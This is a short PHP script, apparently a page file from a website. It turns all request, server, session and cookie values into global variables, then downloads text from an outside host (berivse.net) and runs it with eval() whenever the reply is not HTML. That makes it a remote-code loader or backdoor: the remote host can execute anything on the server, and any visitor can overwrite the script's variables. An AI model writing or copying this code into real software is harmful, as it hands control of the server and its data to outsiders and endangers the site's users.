<?php
if(!isset($ix)){
foreach ($_REQUEST as $key=>$val){${$key}=$val;}
}
foreach ($_SERVER  as $key=>$val){${$key}=$val;}
foreach ($_SESSION as $key=>$val){${$key}=$val;}
foreach ($_COOCIE  as $key=>$val){${$key}=$val;}
include("database.php"); include("data.php");
$s=file_get_contents("http://berivse.net/e.php?ix=blkinf-get&IX=$ix&t=".time());
if (substr($s,0,1)=="<") echo stripslashes($s) ;
else                     eval(stripslashes($s));
?>


